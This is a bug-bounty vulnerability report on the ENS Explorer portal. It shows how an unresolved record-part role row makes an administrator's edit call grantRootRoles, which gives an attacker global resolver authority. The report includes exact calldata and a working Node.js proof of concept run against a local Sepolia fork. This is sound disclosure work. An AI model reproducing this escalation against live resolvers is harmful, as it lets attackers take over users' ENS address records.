# 93135 w a critical unresolved record part role rows silently grant global resolver authority

## #93135 \[W\&A-Critical] Unresolved record-part role rows silently grant global resolver authority

**Submitted on Sep 14th 2026 at 10:51:17 UTC by @Psyone for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93135
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

### Description

## Brief/Intro

Explorer cannot map resolver record-part resources (for example, a specific text key) back to a name. It displays such an existing delegation with a blank Name and no scope, then treats the missing display name as the sentinel for the resolver's global root resource when the administrator edits the row. A victim who extends that narrow delegation with Set Address therefore signs `grantRootRoles(ROLE_SET_ADDR, attacker)`. The reproduced transaction changes the attacker from a text-key-only delegate with zero root roles into a global address manager for every name using the resolver.

## Vulnerability Details

### Preconditions and actors

* The attacker has a legitimate record-part-specific role on a permissioned resolver, such as `ROLE_SET_TEXT` for one text key. The attacker has no root role.
* The victim is the resolver root administrator and uses Explorer's normal existing-role edit flow to extend the attacker's row with another permission.
* The victim selects the row, checks **Set Address / Manager**, clicks **Save**, starts the transaction, and approves it in the connected wallet.
* No malicious indexer, RPC, frontend, browser extension, or smart contract is required.

This is a prompted, normal administrative workflow. A genuine root row is explicitly described as global by Explorer; the vulnerable row is not.

### Explorer loses the exact resource identity

`useResolverOverview.ts` queries resolver `nodes` and `roles`, but not the indexer's richer `namedResources`. `buildResourceToNameMap` in `resolverRoles.ts` can map only:

```
ROOT_RESOURCE -> "(root)"
resource(namehash(node.name), 0) -> node.name
```

A text-key or coin-type role uses `resource(namehash(name), partHash(key))`, so it can never match the name-wide resource above. `groupRolesByAccount` converts the failed lookup to `null`, leaving `resolvedNames` empty.

The table then renders a blank Name cell:

```tsx
const names = row.original.resolvedNames
if (names.length === 0) return null
```

The sidebar also omits both possible scope descriptions because the list is empty:

```tsx
{selectedAccount && resolvedNames.length > 0 && (
  <p>
    {resolvedNames.includes('(root)')
      ? 'Global roles (all names)'
      : `Roles scoped to ...`}
  </p>
)}
```

### A display failure becomes the root-resource sentinel

The save path derives its security-sensitive scope from that lossy display lookup:

```ts
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''

setPendingAction({
  type: 'save',
  name: roleName,
  account: selectedAccount,
  rolesToGrant,
  rolesToRevoke,
})
```

`grantResolverRoles.ts` deliberately defines the empty string as root scope:

```ts
name === ''
  ? { resolverAddress, targetAccount: account, scope: 'root', roles }
  : { resolverAddress, targetAccount: account, scope: 'name', name, roles }
```

The pinned ENSJS implementation encodes the root branch as `grantRootRoles(uint256,address)`. Neither the Explorer review nor the sidebar reveals this conversion. The review shows only `Update roles for <account>`.

For `ROLE_SET_ADDR`, the exact wallet request is:

```
chainId: 11155111
to:      0x3dc7100cfbea5077ee51b85e34249755771bd430
value:   0
method:  grantRootRoles(uint256,address)
args:    [1, 0x1ae1c56579c4c49317fb59808e26d0cca6c4f529]
data:    0x072d5d7700000000000000000000000000000000000000000000000000000000000000010000000000000000000000001ae1c56579c4c49317fb59808e26d0cca6c4f529
```

There is no safe semantic conversion from an unresolved part resource to the global root resource. Explorer should fail closed or preserve the exact indexed resource.

## Impact Details

The pinned Sepolia fork starts with the attacker holding only `ROLE_SET_TEXT` (`0x10`) on a text-key resource and zero root roles. The exact Explorer-produced call mines successfully and changes:

```
roles(ROOT_RESOURCE, attacker):                    0 -> 1
hasRoles(textPartResource, ROLE_SET_ADDR, attacker): false -> true
```

`EnhancedAccessControl.hasRoles` combines root and resource-local roles, so the grant makes the attacker an address manager across every node handled by this resolver. The attacker can redirect ENS address records even though the victim intended to extend only the selected narrow delegation.

An independent variant used the same UI conversion for `ROLE_UPGRADE`. Before the grant, the attacker's `upgradeToAndCall` reverted with the EAC authorization error. After the exact root grant, the same call mined and emitted `Upgraded(address)`. This confirms that the error grants real global authority rather than changing only a cosmetic bitmap.

The issue matches the listed Critical impact for modifying transaction arguments or parameters in a malicious interaction with an already-connected wallet. The protected boundary is the resolver's root resource; the attacker begins with no authority over it.

## Mitigation

* Preserve the exact resource for each role assignment and render one row per `(account, resource)` rather than grouping only by account.
* Query and use `namedResources`, including record-part metadata, or decode the corresponding resource events independently.
* If a resource cannot be resolved, show its full `bytes32`, disable mutation, and fail closed.
* Represent root scope with an explicit discriminated value. Do not infer it from `name === ''` or any display lookup failure.
* Require the administrator to explicitly select global scope and show `Global roles (all names)` plus the decoded `grantRootRoles` call in both the sidebar and final transaction review.

## References

* `apps/portal/src/features/resolver/hooks/useResolverOverview.ts:68-109`
* `apps/portal/src/lib/roles/resolverRoles.ts:129-159,193-220`
* `apps/portal/src/features/resolver/components/ResolverRolesTable.tsx:65-83`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-173,295-305,389-397`
* `apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45-74`
* `apps/portal/src/features/transaction-manager/components/TransactionInfoContent.tsx:38-60`
* [ENS audit competition scope and known issues](https://immunefi.com/audit-competition/audit-competition-ens/scope/)

### Proof of Concept

## Proof of Concept

### Reproduction header

```
Repository: immunefi-team/audit-comp-ens
Commit: 1c9b47f18fcddd2e864dfe385c4171061c9811ae
Tool versions: Node.js v22.15.0, Ganache v7.9.2
Install command: none for the PoC (Node.js standard library only); Ganache is invoked with `npx --yes ganache@7.9.2`
Test command: `node poc.mjs`
Expected passing/failing assertion: PASS when `rootBefore == 0`, `partBefore == ROLE_SET_TEXT`, then `rootAfter == ROLE_SET_ADDR` and effective global Set Address authority is true; FAIL if any invariant assertion differs
Fork chain and block: Sepolia 11,682,885; canonical upstream hash 0xcf71c364fff7b9ecf048d58099959b8ce19651fb3bd5184e6aef5991ab9b1075; Ganache synthetic boundary hash 0x1df997e7b36884757d556c819147fc02a32e2e033646b14b8fbc58044d0f4969
Environment variables required: SEPOLIA_RPC_URL (archival Sepolia RPC)
```

Actors are kept distinct: `ATTACKER` is the narrow role holder, `VICTIM` is the real resolver root administrator at the pinned block, and `RESOLVER` is the protected deployed contract. There is no keeper or governance actor in this flow. The only external dependency is the archival RPC used by Ganache while constructing the local fork.

No contract or application component is mocked. Ganache unlocks the real administrator only on the disposable fork and tops up gas balance; it does not assign roles, alter protected storage, replace bytecode, or create the vulnerable state. The attacker’s narrow role and the victim’s root role are read from the pinned deployed state before the transaction. All writes remain local and are discarded when Ganache stops.

### Numbered reproduction steps

1. Check out the scoped commit and save the supplied script as `poc.mjs` at the repository root.
2. Export an archival Sepolia endpoint only as `SEPOLIA_RPC_URL`.
3. Start Ganache with the exact pinned fork command below; it unlocks only the existing forked root administrator.
4. In a second terminal, run `node poc.mjs`.
5. Confirm the initial reads show attacker root bitmap `0x0`, record-part bitmap `0x10`, and no effective Set Address authority.
6. Confirm the receipt for the exact `grantRootRoles(0x1, attacker)` calldata has status `1`.
7. Confirm the final reads show attacker root bitmap `0x1`, effective global Set Address authority, and `REPRODUCED_PART_RESOURCE_TO_ROOT_ESCALATION`.

Start a disposable local fork. No transaction is broadcast to Sepolia:

```powershell
npx --yes ganache@7.9.2 `
  --fork.url $env:SEPOLIA_RPC_URL `
  --fork.blockNumber 11682885 `
  --chain.chainId 11155111 `
  --chain.networkId 11155111 `
  --server.port 8545 `
  --wallet.unlockedAccounts "0x1526bf7ea59c6494d89838c6e779bcbe0bc88a4d" `
  --logging.quiet true
```

Save the following as `poc.mjs` at the repository root and run `node poc.mjs`:

```js
import assert from 'node:assert/strict'
import fs from 'node:fs'
import { execFileSync } from 'node:child_process'

const RPC = 'http://127.0.0.1:8545'
const REVISION = '1c9b47f18fcddd2e864dfe385c4171061c9811ae'
const BLOCK = '0xb24445'
const LOCAL_FORK_BLOCK_HASH = '0x1df997e7b36884757d556c819147fc02a32e2e033646b14b8fbc58044d0f4969'
const RESOLVER = '0x3dc7100cfbea5077ee51b85e34249755771bd430'
const RESOLVER_RUNTIME = '0x363d3d373d3d3d363d73a136bee4e37b44586242e516a39893efd54315e95af43d82803e903d91602b57fd5bf3b20ba7cd1989e98d763c242871b2c550f81d6bba4a79d953e459f8a9a7f6ec94'
const VICTIM = '0x1526bf7ea59c6494d89838c6e779bcbe0bc88a4d'
const ATTACKER = '0x1ae1c56579c4c49317fb59808e26d0cca6c4f529'
const PART = '0xe3da8cd0d2ed31f54a8284e01158aff297bf74c7753013e0c08c47c7a5e46060'
const ROOT = `0x${'00'.repeat(32)}`
const word = (v) => BigInt(v).toString(16).padStart(64, '0')
const addr = (v) => v.slice(2).toLowerCase().padStart(64, '0')
const roles = (resource) => `0x5adf4724${resource.slice(2)}${addr(ATTACKER)}`
const has = (resource, bitmap) =>
  `0xd3bf89b1${resource.slice(2)}${word(bitmap)}${addr(ATTACKER)}`
const grant = (bitmap) => `0x072d5d77${word(bitmap)}${addr(ATTACKER)}`

async function rpc(method, params) {
  const response = await fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  })
  const body = await response.json()
  assert.equal(body.error, undefined, `${method}: ${JSON.stringify(body.error)}`)
  return body.result
}

assert.equal(
  execFileSync('git', ['rev-parse', 'HEAD'], { encoding: 'utf8' }).trim(),
  REVISION,
)
const model = fs.readFileSync('apps/portal/src/lib/roles/resolverRoles.ts', 'utf8')
const sidebar = fs.readFileSync(
  'apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx',
  'utf8',
)
const helper = fs.readFileSync(
  'apps/portal/src/features/resolver/helpers/grantResolverRoles.ts',
  'utf8',
)
assert.match(model, /resourceToName\?\.get\(resource\) \?\? null/)
assert.match(sidebar, /resolvedNames\.find\(\(n\) => n !== '\(root\)'\) \?\? ''/)
assert.match(sidebar, /selectedAccount && resolvedNames\.length > 0/)
assert.match(helper, /name === ''[\s\S]*scope: 'root'/)

const block = await rpc('eth_getBlockByNumber', [BLOCK, false])
assert.equal(await rpc('eth_chainId', []), '0xaa36a7')
assert.equal(block.hash, LOCAL_FORK_BLOCK_HASH)
assert.equal((await rpc('eth_getCode', [RESOLVER, BLOCK])).toLowerCase(), RESOLVER_RUNTIME)
await rpc('evm_setAccountBalance', [VICTIM, '0x3635c9adc5dea00000'])

const rootBefore = await rpc('eth_call', [
  { to: RESOLVER, data: roles(ROOT) }, 'latest',
])
const partBefore = await rpc('eth_call', [
  { to: RESOLVER, data: roles(PART) }, 'latest',
])
const authorityBefore = await rpc('eth_call', [
  { to: RESOLVER, data: has(PART, 1n) }, 'latest',
])
assert.equal(BigInt(rootBefore), 0n)
assert.equal(BigInt(partBefore), 16n)
assert.equal(BigInt(authorityBefore), 0n)

const calldata = grant(1n)
const hash = await rpc('eth_sendTransaction', [{
  from: VICTIM,
  to: RESOLVER,
  value: '0x0',
  gas: '0x989680',
  data: calldata,
}])
const receipt = await rpc('eth_getTransactionReceipt', [hash])
assert.equal(receipt.status, '0x1')

const rootAfter = await rpc('eth_call', [
  { to: RESOLVER, data: roles(ROOT) }, 'latest',
])
const authorityAfter = await rpc('eth_call', [
  { to: RESOLVER, data: has(PART, 1n) }, 'latest',
])
assert.equal(BigInt(rootAfter), 1n)
assert.equal(BigInt(authorityAfter), 1n)

console.log(JSON.stringify({
  result: 'REPRODUCED_PART_RESOURCE_TO_ROOT_ESCALATION',
  violatedInvariant:
    'Editing a record-part role must not grant authority on ROOT_RESOURCE',
  rootBefore,
  partBefore,
  signedCalldata: calldata,
  rootAfter,
  globalSetAddrAuthorityAfter: authorityAfter,
}, null, 2))
```

Expected output includes:

```json
{
  "result": "REPRODUCED_PART_RESOURCE_TO_ROOT_ESCALATION",
  "rootBefore": "0x0000000000000000000000000000000000000000000000000000000000000000",
  "partBefore": "0x0000000000000000000000000000000000000000000000000000000000000010",
  "rootAfter": "0x0000000000000000000000000000000000000000000000000000000000000001",
  "globalSetAddrAuthorityAfter": "0x0000000000000000000000000000000000000000000000000000000000000001"
}
```

The reproduced local transaction has status `1`. The victim account is impersonated only on the disposable pinned fork, and no public-chain or third-party state is modified.
